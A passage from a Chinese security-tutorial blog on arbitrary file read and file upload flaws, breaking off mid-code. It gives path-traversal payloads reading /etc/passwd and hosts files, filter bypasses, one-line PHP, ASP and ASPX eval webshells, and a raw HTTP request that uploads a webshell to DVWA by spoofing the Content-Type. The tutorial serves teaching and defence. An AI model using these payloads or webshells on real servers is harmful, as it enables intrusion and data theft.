      <title>文件读取</title>
      <link href="/2022/11/17/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2022/11/17/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h1><p>​一些网站的需求，可能会提供文件查看与下载的功能。如果对用户查看或下载的文件没有限制或者限制绕就可以查看或下载任意文件。这些文件可以是源代码文件，配置文件，敏感文件等等。过，</p><ul><li>任意文件读取会造成(敏感)信息泄露</li><li>任意文件读取大概率是由于其他漏洞引发的，如，RCE、目录遍历、文件包含等</li><li>任意文件读取与任意文件下载本质上没有区别，信息都是从服务端流向浏览器的。</li></ul><p>​         任意文件读取与下载可能形式不同，但是从本质上讲读取与下载没有区别，从权限角度来讲，读取与下载都需要读权限。</p><h2 id="1-1漏洞成因"><a href="#1-1漏洞成因" class="headerlink" title="1.1漏洞成因"></a>1.1漏洞成因</h2><p>不管是任意文件读取还是任意文件下载，触发漏洞的条件都是相同的</p><ul><li>存在读取文件的功能(函数)，也就是说，Web 应用开放了文件读取功能。</li><li>读取文件的路径客户端可控，完全控制或影响文件路径参数;</li><li>没有对文件路径进行校验或者校验不严导致校验被绕过</li><li>输出了文件的内容</li></ul><h2 id="1-2漏洞危害"><a href="#1-2漏洞危害" class="headerlink" title="1.2漏洞危害"></a>1.2漏洞危害</h2><p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br>可以配合其他漏洞，构成完整攻击链。对源代码文件进行代码审计，查找更多的漏洞。<br>任意文件读取与下载重点关注的文件：</p><ul><li>源代码</li><li>配置文件</li><li>敏感文件</li><li>日志文件</li></ul><h2 id="1-3漏洞分类"><a href="#1-3漏洞分类" class="headerlink" title="1.3漏洞分类"></a>1.3漏洞分类</h2><ul><li>任意文件读取</li><li>任意文件下载</li></ul><h2 id="1-4任意文件读取"><a href="#1-4任意文件读取" class="headerlink" title="1.4任意文件读取"></a>1.4任意文件读取</h2><h3 id="1-4-1-文件读取"><a href="#1-4-1-文件读取" class="headerlink" title="1.4.1 文件读取"></a>1.4.1 文件读取</h3><table><thead><tr><th>函数</th><th>含义</th></tr></thead><tbody><tr><td>readfile()</td><td>直接读取文件内容 <br />自带输出功能</td></tr><tr><td>file_get_contents()</td><td>直接读取文件内容<br>需要输出读取内容</td></tr><tr><td>fread()</td><td>打开文件<br>计算文件大小<br>读取文件<br/>输出文件<br/>关闭文件</td></tr></tbody></table><p><strong>readfile()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// readfile.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="string">&quot;../phpinfo.php&quot;</span>; <span class="title function_ invoke__">readfile</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>file_get_contents()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file_get_contents.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="string">&quot;../phpinfo.php&quot;</span>; <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>fread()</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fread.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="string">&quot;../phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fp</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$f_size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$fp</span>); <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="variable">$f_size</span>); <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-4-2-任意文件读取"><a href="#1-4-2-任意文件读取" class="headerlink" title="1.4.2  任意文件读取"></a><strong>1.4.2</strong>  <strong>任意文件读取</strong></h3><p>变量$fp，会捕获GET 方式传递过来的filepath 参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$fp = @$_GET[&#x27;filepath&#x27;];</span><br></pre></td></tr></table></figure><p>filepath 客户端可控，并且没有经过校验，会造成任意文件读取漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=index.php ?filepath=/etc/passwd</span><br><span class="line">?filepath=c:\windows\system32\drivers\etc\hosts ?filepath=c:\phpstudy_2016\apache\conf\httpd.conf ?filepath=c:\phpstudy_2016\mysql\my.ini</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">?filepath=../../../../../../../../../../phpstudy_2016/www/phpinfo.php ?filePath=../../../../../../../../windows\system32\drivers\etc\hosts ?filePath=../../../../../../etc/hosts</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="1-5-任意文件下载"><a href="#1-5-任意文件下载" class="headerlink" title="1.5  任意文件下载"></a><strong>1.5</strong>  任意文件下载</h2><h3 id="1-5-1-一般情况"><a href="#1-5-1-一般情况" class="headerlink" title="1.5.1  一般情况"></a><strong>1.5.1</strong>  <strong>一般情况</strong></h3><p><strong>a 标签下载：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&#x27;./a.jpg&#x27;</span>&gt;</span>IMG Download<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-5-2-PHP-实现"><a href="#1-5-2-PHP-实现" class="headerlink" title="1.5.2  PHP 实现"></a><strong>1.5.2</strong>  <strong>PHP</strong> <strong>实现</strong></h3><p>PHP 文件下载实现过程：</p><ul><li><p>先读取文件</p></li><li><p>在输出文件</p></li><li><p>提供下载</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file-download.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="string">&#x27;./a.jpg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:image/jpg&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:attachment;fileName=&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$fp</span>)); <span class="title function_ invoke__">readfile</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-5-3-任意文件下载"><a href="#1-5-3-任意文件下载" class="headerlink" title="1.5.3  任意文件下载"></a><strong>1.5.3</strong>  <strong>任意文件下载</strong></h3><p>任意文件下载的条件：</p><ul><li><p>已知目标文件路径</p></li><li><p>目标文件路径，客户端可控</p></li><li><p>没有经过校验或校验不严格</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?filepath=c:/windows/system32/drivers/etc/hosts ?filepath=/etc/passwd</span><br></pre></td></tr></table></figure><h1 id="2-任意文件读取攻防"><a href="#2-任意文件读取攻防" class="headerlink" title="2.任意文件读取攻防"></a>2.任意文件读取攻防</h1><h2 id="2-1-路径过滤"><a href="#2-1-路径过滤" class="headerlink" title="2.1  路径过滤"></a><strong>2.1</strong>  路径过滤</h2><h3 id="2-1-1-过滤"><a href="#2-1-1-过滤" class="headerlink" title="2.1.1  过滤..&#x2F;"></a><strong>2.1.1</strong>  <strong>过滤</strong><strong>..&#x2F;</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$fp = @$_GET[&#x27;filepath&#x27;];</span><br><span class="line"></span><br><span class="line">$fp = str_replace(&quot;../&quot;,&quot;&quot;,$fp); readfile($fp);</span><br></pre></td></tr></table></figure><h2 id="2-2-简单绕过"><a href="#2-2-简单绕过" class="headerlink" title="2.2 简单绕过"></a><strong>2.2</strong> 简单绕过</h2><h3 id="2-2-1-双写绕过"><a href="#2-2-1-双写绕过" class="headerlink" title="2.2.1  双写绕过"></a><strong>2.2.1</strong>  <strong>双写绕过</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=..././..././..././..././..././..././..././windows\system32\drivers\etc\hosts</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-2-绝对路径"><a href="#2-2-2-绝对路径" class="headerlink" title="2.2.2  绝对路径"></a><strong>2.2.2</strong>  <strong>绝对路径</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=c:/windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h3 id="2-2-3-使用"><a href="#2-2-3-使用" class="headerlink" title="2.2.3  使用..\"></a><strong>2.2.3</strong>  <strong>使用</strong>..\</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filepath=..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h1 id="3-任意文件读取挖掘"><a href="#3-任意文件读取挖掘" class="headerlink" title="3.任意文件读取挖掘"></a>3.任意文件读取挖掘</h1><h2 id="3-1-手工挖掘"><a href="#3-1-手工挖掘" class="headerlink" title="3.1  手工挖掘"></a><strong>3.1</strong>  手工挖掘</h2><table><thead><tr><th>从文件名上看</th><th>从参数名上看</th></tr></thead><tbody><tr><td>readfile.php <br>filedownload.php <br>filelist.php</td><td>f&#x3D;<br/>file&#x3D; <br/>filepath&#x3D; <br/>fp&#x3D; <br/>readfile&#x3D; <br/>path&#x3D; <br/>readpath&#x3D; <br/>url&#x3D; <br/>menu&#x3D;<br/>META-INF&#x3D; <br/>WEB-INF&#x3D; <br/>content&#x3D;</td></tr></tbody></table><h2 id="3-2-经典案例"><a href="#3-2-经典案例" class="headerlink" title="3.2 经典案例"></a><strong>3.2</strong> 经典案例</h2><p><a href="https://zhuanlan.zhihu.com/p/653454304">metinfo_6.0.0_file-read</a></p><h1 id="4-漏洞修复方案"><a href="#4-漏洞修复方案" class="headerlink" title="4.漏洞修复方案"></a>4.漏洞修复方案</h1><h2 id="4-1-输入验证"><a href="#4-1-输入验证" class="headerlink" title="4.1 输入验证"></a><strong>4.1</strong> 输入验证</h2><ul><li>让web 用户只能访问（读取），所需要的文件和路径。</li></ul><h2 id="4-2-避免其他漏洞"><a href="#4-2-避免其他漏洞" class="headerlink" title="4.2 避免其他漏洞"></a><strong>4.2</strong> 避免其他漏洞</h2><ul><li>不能有文件包含漏洞，目录遍历漏洞或其他漏洞。</li></ul><h2 id="4-3-限定文件的访问范围"><a href="#4-3-限定文件的访问范围" class="headerlink" title="4.3 限定文件的访问范围"></a><strong>4.3</strong> 限定文件的访问范围</h2><ul><li><p>让用户不能访问Web 根目录以外的路径。</p></li><li><p>php.ini 配置文件中，可以通过选项open_basedir 来限定文件访问的范围</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open_basedir = c:\www\</span><br></pre></td></tr></table></figure><h1 id="5-参考连接"><a href="#5-参考连接" class="headerlink" title="5.参考连接"></a>5.参考连接</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/lijiejie/ds_store_exp https://blog.csdn.net/GitChat/article/details/79014538 https://www.secpulse.com/archives/124398.html https://github.com/kost/dvcs-ripper https://github.com/lijiejie/GitHack http://www.vuln.cn/2225 https://g</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/11/15/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/11/15/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-任意文件上传概述"><a href="#1-任意文件上传概述" class="headerlink" title="1.任意文件上传概述"></a>1.任意文件上传概述</h1><h2 id="1-1-漏洞成因"><a href="#1-1-漏洞成因" class="headerlink" title="1.1  漏洞成因"></a><strong>1.1</strong>  漏洞成因</h2><p>服务器配置不当，开启了PUT 方法。</p><p>Web 应用开放了文件上传功能，没有对上传的文件做足够的限制和过滤。在程序开发部署时，没有考虑以下因素，导致限制被绕过：</p><ul><li><p>代码特性</p></li><li><p>组件漏洞；</p></li><li><p>Web 容器漏洞；系统特性；</p></li></ul><h2 id="1-2-漏洞危害"><a href="#1-2-漏洞危害" class="headerlink" title="1.2  漏洞危害"></a><strong>1.2</strong>  漏洞危害</h2><p>上传恶意代码（文件，程序），并执行恶意代码（文件，程序）：</p><ul><li><p>直接上传后门文件并执行，导致网站沦陷；</p></li><li><p>通过恶意文件，利用其他漏洞拿到管理员权限（提权），导致服务器沦陷。</p></li><li><p>通过文件上传漏洞获得的网站后门，叫WebShell。</p></li></ul><h1 id="2-WebShell-解析"><a href="#2-WebShell-解析" class="headerlink" title="2.WebShell 解析"></a>2.<strong>WebShell</strong> 解析</h1><h2 id="2-1-Shell"><a href="#2-1-Shell" class="headerlink" title="2.1 Shell"></a><strong>2.1</strong> <strong>Shell</strong></h2><h3 id="2-1-1-命令解释器"><a href="#2-1-1-命令解释器" class="headerlink" title="2.1.1  命令解释器"></a><strong>2.1.1</strong>  <strong>命令解释器</strong></h3><table><thead><tr><th>Windows</th><th>LINUX</th></tr></thead><tbody><tr><td>powershell    cmd</td><td>bash 、sh、zsh</td></tr></tbody></table><h2 id="2-2-WebShell"><a href="#2-2-WebShell" class="headerlink" title="2.2 WebShell"></a><strong>2.2</strong> <strong>WebShell</strong></h2><p>WebShell 是一个网站的后门，也是一个命令解释器。通过Web 方式，使用HTTP| HTTPS 协议传递命令消息到服务器，并且继承了Web 用户的权限，在服务器上远程执行命令。WebShell 从本质上讲，就是服务器端可运行的脚本文件，后缀名通常为：</p><ul><li><p>.php</p></li><li><p>.asp</p></li><li><p>.aspx</p></li><li><p>.jsp</p></li></ul><p> WebShell 接收来自于Web 用户的命令，然后在服务器端执行，也称为网站木马、木马后门、网马等。</p><table><thead><tr><th>Apache HTTPD</th><th>php</th></tr></thead><tbody><tr><td>IIS</td><td>asp| aspx| php</td></tr><tr><td>Tomcat</td><td>jsp| jspx</td></tr></tbody></table><h3 id="2-2-1-大马"><a href="#2-2-1-大马" class="headerlink" title="2.2.1  大马"></a><strong>2.2.1</strong>  <strong>大马</strong></h3><p>代码量比较大，与小马对比。</p><h3 id="2-2-2-小马"><a href="#2-2-2-小马" class="headerlink" title="2.2.2  小马"></a><strong>2.2.2</strong>  <strong>小马</strong></h3><p>一句话木马，需要与中国菜刀配合。特点：短小精悍，功能强大。</p><p>三大基本功能：文件管理、虚拟终端、数据库管理。php 脚本格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  @eval($_REQUEST[777])?&gt;</span><br><span class="line">//代码执行函数+传参点</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>asp 脚本形式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval request(&quot;777&quot;)%&gt;</span><br></pre></td></tr></table></figure><p>aspx 脚本形式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;777&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-2-3GetShell"><a href="#2-2-3GetShell" class="headerlink" title="2.2.3GetShell"></a>2.2.3<strong>GetShell</strong></h3><p>GetShell 是获取WebShell 的过程或结果。文件上传漏洞的利用是GetShell 的主要方式，但不是唯一手段。</p><h3 id="2-2-4-WebShell-项目"><a href="#2-2-4-WebShell-项目" class="headerlink" title="2.2.4  WebShell 项目"></a><strong>2.2.4</strong>  <strong>WebShell</strong> <strong>项目</strong></h3><p><a href="https://github.com/tennc/webshell">tennc&#x2F;webshell</a></p><h1 id="3-任意文件上传攻防"><a href="#3-任意文件上传攻防" class="headerlink" title="3.任意文件上传攻防"></a>3.任意文件上传攻防</h1><h2 id="3-1-毫无检测"><a href="#3-1-毫无检测" class="headerlink" title="3.1  毫无检测"></a><strong>3.1</strong>  毫无检测</h2><h3 id="3-2-1-源代码"><a href="#3-2-1-源代码" class="headerlink" title="3.2.1  源代码"></a><strong>3.2.1</strong>  <strong>源代码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-1-2-代码审计"><a href="#3-1-2-代码审计" class="headerlink" title="3.1.2  代码审计"></a><strong>3.1.2</strong>  <strong>代码审计</strong></h3><ul><li>对文件上传没有做任何过滤；</li><li>任意文件上传。</li></ul><h2 id="3-2-黑白名单策略"><a href="#3-2-黑白名单策略" class="headerlink" title="3.2 黑白名单策略"></a><strong>3.2</strong> 黑白名单策略</h2><h3 id="3-2-1-文件检测"><a href="#3-2-1-文件检测" class="headerlink" title="3.2.1  文件检测"></a><strong>3.2.1</strong>  <strong>文件检测</strong></h3><ul><li><p>文件后缀名</p></li><li><p>文件类型</p></li><li><p>文件内容</p></li></ul><h3 id="3-2-2-后缀名黑名单"><a href="#3-2-2-后缀名黑名单" class="headerlink" title="3.2.2  后缀名黑名单"></a><strong>3.2.2</strong>  <strong>后缀名黑名单</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$deny_ext = array( &quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.phtml&quot;,&quot;.pht&quot;, &quot;.html&quot;,&quot;.htm&quot;, &quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jhtml&quot;, &quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;, &quot;.cer&quot;,&quot;.swf&quot;,</span><br><span class="line">&quot;.htaccess&quot; );</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-2-3-后缀名白名单"><a href="#3-2-3-后缀名白名单" class="headerlink" title="3.2.3  后缀名白名单"></a><strong>3.2.3</strong>  <strong>后缀名白名单</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allow_ext = array( &#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;,&#x27;bmp&#x27;,&#x27;gif&#x27;,&#x27;svg&#x27;, &#x27;zip&#x27;,&#x27;tar.gz&#x27;, &#x27;doc&#x27;,&#x27;docx&#x27;,&#x27;pdf&#x27;,&#x27;xls&#x27;,&#x27;ppt&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-3-文件类型检测"><a href="#3-3-文件类型检测" class="headerlink" title="3.3 文件类型检测"></a><strong>3.3</strong> 文件类型检测</h2><h3 id="3-3-1-源代码"><a href="#3-3-1-源代码" class="headerlink" title="3.3.1  源代码"></a><strong>3.3.1</strong>  <strong>源代码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>; &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-3-2-代码审计"><a href="#3-3-2-代码审计" class="headerlink" title="3.3.2  代码审计"></a><strong>3.3.2</strong>  <strong>代码审计</strong></h3><ul><li>上传的文件没有重命名；</li><li>Content-Type 类型白名单检测；</li><li>任意文件上传。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /dvwa_2.0.1/vulnerabilities/upload/ HTTP/1.1 Host: 10.4.7.196</span><br><span class="line">Content-Length: 432 Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1 Origin: http://10.4.7.196</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3xRrwk8liSH6rVVn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/sig ned-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://10.4.7.196/dvwa_2.0.1/vulnerabilities/upload/</span><br><span class="line">Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:  security=medium;  PHPSESSID=rkgc97fga9q51hn8vciv5dt5e7;  ASPSESSIONIDSASCAARA=DPNHBLIBFBKFLHLNLEHPMJCH; ASPXSpy=5854b7d51176229708197a5334ba1195</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary3xRrwk8liSH6rVVn</span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundary3xRrwk8liSH6rVVn</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;yjh.php&quot; Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_REQUEST[777]);phpinfo(); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-4-文件后缀名或内容检测"><a href="#3-4-文件后缀名或内容检测" class="headerlink" title="3.4 文件后缀名或内容检测"></a><strong>3.4</strong> 文件后缀名或内容检测</h2><h3 id="3-4-1-源代码"><a href="#3-4-1-源代码" class="headerlink" title="3.4.1  源代码"></a><strong>3.4.1</strong>  <strong>源代码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_ext</span>   = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_tmp</span>   = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || <span class="title function_ invoke__">strtolower</span>(</span><br><span class="line"><span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span 